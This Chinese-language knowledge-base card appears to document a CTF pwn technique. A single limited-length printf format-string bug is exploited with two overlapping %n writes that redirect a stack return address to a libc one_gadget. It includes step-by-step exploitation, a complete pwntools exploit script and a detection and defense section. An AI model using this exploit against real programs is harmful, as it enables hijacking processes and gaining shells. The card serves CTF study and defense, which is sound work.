---
id: binary-pwn-format-string-one-shot-stack-return-address-two-n-writes
title: 一次性栈上格式化字符串：单次 printf 用两段 %n 写栈返回地址直达 one_gadget
type: scenario
domain: binary
path: binary/pwn/format-string
technique: one-shot-stack-format-string-overlapping-n-return-address
aliases:
- 一次性格式化字符串
- 栈上格式化字符串
- 两次 %n 写返回地址
- 3 字节重叠 %n
- one_gadget 覆盖返回地址
- 有限长度格式化
- '%10$n %11$n'
tags:
- pwn
- format-string
- one-gadget
- return-address
- stack
- pie
- full-relro
- partial-overwrite
severity: high
confidence: medium
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V154
  verified_at: '2026-11-06T07:40:40+08:00'
  notes: 已对照原文与4张图核对：show() read(0,buf,0x30) 后 printf(buf)、全保护；exp 用 %7$p%11$p 泄 libc/栈（-0x84570/-0x118）、one_gadget 0xe3b01、ogg1=ogg&0xffffff、ogg2=((ogg>>24)&0xffffff)-ogg1、payload ljust(0x20)+p64(stack)+p64(stack+3)、%10$n/%11$n 指向 buf+0x20/0x28 的重叠 3+3 字节写与原文一致；图01-03 为栈布局/参数/调试过程，图04 专门指出 Python 中 - 优先级高于 & 的括号错误，卡内已还原。未验证点：原文为 2026 楚慧杯 house_1 非预期解，未本机复跑；one_gadget 约束与 %10/%11 参数槽、stack 偏移需按目标 libc/栈帧复核（卡内 confidence=medium 已注明）；图02/03 含作者调试中间态；frontmatter 无 sources/source_url（全库惯例）。
---

## 一句话结论

在 64 位全保护（PIE + Canary + NX + Full RELRO）、且输入长度受限的一次性格式化字符串场景中，可以把目标栈地址（返回地址、栈上指针）作为数据放在格式化字符串缓冲区里，用 `%10$n`/`%11$n` 两次重叠的 3 字节写入覆盖返回地址的低 6 字节，把它改成 libc 里的 one_gadget，从而单次 `printf` 完成劫持并拿 shell。

## 原理

- **漏洞形态**：程序 `read(0, buf, 0x30)` 后直接 `printf(buf)`，用户输入就是格式化字符串；`buf` 位于栈上（如 `rbp-0x40`），同一块缓冲区里既有格式串，也能放攻击者写的地址数据。
- **为什么能写栈**：`%n` 把已输出字符数写到对应参数指向的地址。格式化字符串的变参既来自寄存器（rsi/rdx/rcx/r8/r9），也来自栈上的后续槽位；把目标地址放在 `buf` 的固定偏移处，就能用 `%k$n` 精确指向它。原文中 `buf+0x20` 与 `buf+0x28` 分别对应 `%10$n`/`%11$n`。
- **为什么是重叠写**：`%n` 一次写 4 字节（`int`）。要在一次 printf 里写 6 字节返回地址，采用“第一次写 A 处 4 字节、第二次写 A+3 处 4 字节”的重叠方式：第二次写的首字节覆盖第一次写的第 4 字节，两次合起来正好是 6 字节，且第 4 字节可控为 0（高位补零）。
- **数值拆分**：把目标地址拆成低 24 位 `ogg1` 与高 24 位 `ogg2`；第一次 `%<ogg1>c%10$n` 写低 3 字节 + 第 4 字节，第二次 `%<ogg2>c%11$n` 从 A+3 开始写高 3 字节 + 第 4 字节。由于 `%<n>c` 的宽度不能为负，必须满足 `ogg2 >= ogg1`（按实际计算方式），这正是原文所说“有概率、需要低 6 位最高位小于高 6 位最高位”的来源。
- **为什么能改 PIE 返回地址为 libc 地址**：x86-64 用户态地址的高 2 字节为 0，原返回地址（PIE）与目标 one_gadget（libc）都小于 2^48；覆盖低 6 字节、保留高 2 字节（0x0000）即可得到合法的新地址。因此不需要泄露 PIE 基址，也不需要 GOT（Full RELRO 下 GOT 只读）。
- **信息泄露**：先用 `%7$p%11$p` 一类位置参数泄露 libc 地址与栈地址；libc 地址减去已知偏移得到基址，栈地址减去固定偏移得到 `buf` 或目标返回地址的位置。原文用 `libc - 0x84570`、`stack - 0x118` 定位。
- **Python 优先级坑**：`(ogg>>24)&0xffffff-ogg1` 会被解析为 `(ogg>>24) & (0xffffff - ogg1)`，原因是 `-` 优先级高于 `&`；必须写成 `((ogg>>24)&0xffffff) - ogg1`。原文脚本与配图专门指出了这个“两层错误”。

## 触发条件

- 64 位程序，存在 `printf(用户可控缓冲区)` 格式化字符串漏洞；输入长度有限（本例 0x30 字节），无法用多轮循环写或大量填充。
- 二进制开启 PIE + Canary + NX + Full RELRO（GOT 不可写，返回地址在栈上）。
- 能通过 `%p`/`%s` 泄露 libc 与栈地址，且栈上缓冲区里有可被 `%k$n` 引用的地址槽位。
- libc 中存在在目标上下文可满足约束的 one_gadget（或可改写为其他 libc 地址/ROP 入口）。
- 目标地址的两个 24 位分片满足宽度非负条件（否则需要换 one_gadget/偏移或重试）。

## 利用步骤

1. 用 `%p` 扫描位置参数，确定 libc 地址、栈地址分别由第几个参数泄露；原文用 `%7$p%11$p`。
2. 计算 libc 基址（减去已知偏移，如 0x84570）和目标栈地址（减去固定偏移，如 0x118），得到要覆盖的返回地址位置 A。
3. 用 `one_gadget libc.so.6` 选一个约束可满足的 gadget（原文选 0xe3b01），计算目标地址 `ogg = libc + offset`。
4. 拆分：`ogg1 = ogg & 0xffffff`；`ogg2 = ((ogg >> 24) & 0xffffff) - ogg1`（注意括号与优先级）。确认 `ogg2 >= 0` 且宽度合理，否则换 gadget 或调整。
5. 拼接 payload：`%{ogg1}c%10$n` + `%{ogg2}c%11$n`，用 `\x00` 填充到 0x20 字节，再追加 `p64(A)` 与 `p64(A+3)`；总长度不超过 0x30。
6. 发送 payload；第一次 `%n` 把低 3 字节及第 4 字节写到 A，第二次从 A+3 写高 3 字节；返回时跳转 one_gadget。
7. 若没拿到 shell，检查 one_gadget 约束、`ogg2` 是否为负、地址偏移与栈对齐，必要时换 gadget/调整 padding。

## PoC

原文 exp（清理了变量名与注释，未在本机执行；偏移/one_gadget 需按目标 libc 调整）：

```python
from pwn import *

io = process('./pwn')
context.log_level = 'debug'

def cmd(choice):
    io.recvuntil(">> ")
    io.sendline(str(choice))

def add():
    cmd(1)

def show(payload):
    cmd(2)
    io.recvuntil("Please write your name:")
    io.send(payload)

add()
show(b'%7$p%11$p')
io.recvuntil(b'0x')
lib = int(io.recv(12), 16) - 0x84570
io.recvuntil(b'0x')
stack = int(io.recv(12), 16) - 0x118
print(hex(lib), hex(stack))

ogg = lib + 0xe3b01
ogg1 = ogg & 0xffffff
ogg2 = ((ogg >> 24) & 0xffffff) - ogg1   # 注意括号：- 优先级高于 &
print(hex(ogg1), hex(ogg2))

payload = f"%{ogg1}c%10$n".encode()
payload += f"%{ogg2}c%11$n".encode()
payload = payload.ljust(0x20, b'\x00')
payload += p64(stack) + p64(stack + 3)
show(payload)

io.interactive()
```

关键点：

```text
- 0x30 字节上限：格式串本身只占十几字节，地址放在 0x20 之后，正好塞满。
- %10$n / %11$n 指向 buf+0x20 / buf+0x28 处的两个栈地址。
- 第一次写 A 起 4 字节，第二次写 A+3 起 4 字节，重叠 1 字节拼成 6 字节。
- ogg2 为负说明高位小于低位，需换 one_gadget 或换目标地址。
```

## 变体与关联

- **写宽变体**：用 `%hn`（2 字节）做 4 次重叠写覆盖 8 字节；用 `%hhn`（1 字节）逐字节写，适合更严格长度限制但需要更多次 printf。
- **目标变体**：改返回地址、改栈上函数指针、改 `__libc_start_main` 返回路径、改 `exit` hook 等；Full RELRO 下不能改 GOT。
- **定位变体**：无栈泄露时可用 `%s` 读栈上已有指针、用 `environ` 泄露栈、用 partial overwrite 只改低 2 字节回到同页 gadget。
- **关联卡片**：[[binary-pwn-format-string-got-hijack]]（GOT 可写时的常规 %n 覆写）；[[binary-pwn-format-string-non-stack-fini-array-loop-write]]（非栈上、借 .fini_array 循环的格式化利用）；[[binary-pwn-format-string-limited-nonstack-loop-condition-byte-rop]]（有限次、非栈场景的循环条件扩充）；[[binary-pwn-format-string-canary-libc-leak-rop-system]]（泄露 Canary/libc 后转 ROP）。
- **边界**：输入长度不足以同时放格式串和地址、无法泄露 libc/栈、one_gadget 约束不满足、`ogg2` 为负、或程序对 `%n` 做过滤时，本手法失效或需变形。

## 检测与防御

- **代码层**：禁止 `printf(用户输入)`，改为 `printf("%s", buf)` 或 `puts(buf)`；编译开启 `-Wformat-security`、`-D_FORTIFY_SOURCE=2`。
- **编译/运行**：保留 PIE、Canary、NX、Full RELRO；开启 ASLR；使用较新 libc 并评估 one_gadget 可用性。
- **输入过滤**：对 `%n`、`%hn`、`%hhn`、位置参数 `%k$` 做检测/拒绝（仅为纵深，不能替代正确写法）。
- **检测**：程序输入中出现大量 `%p`、`%s`、`%n`、`%<数字>c`、`$n` 组合；同一进程/连接先泄露后发送二进制地址；崩溃时 RIP 指向 libc one_gadget 附近；栈上出现被改写的返回地址。
- **响应**：确认利用后隔离主机、轮换凭据，审计同版本二进制是否普遍使用 `printf(buf)`，重新编译修复。
